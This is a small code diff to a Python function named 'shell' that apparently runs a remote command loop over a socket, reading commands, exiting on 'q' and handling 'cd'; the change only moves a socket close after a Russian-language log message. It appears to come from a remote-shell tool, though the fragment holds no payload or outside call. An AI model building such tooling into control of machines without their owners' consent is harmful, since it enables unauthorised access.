@@ -123,8 +123,8 @@ def shell(sock):
         try:
             command = reliable_recv(sock)
             if command == "q":
-                sock.close()
                 logging.info("[+] Клиент закрыт")
+                sock.close()
                 sys.exit(0)
 
             elif command.startswith("cd"):
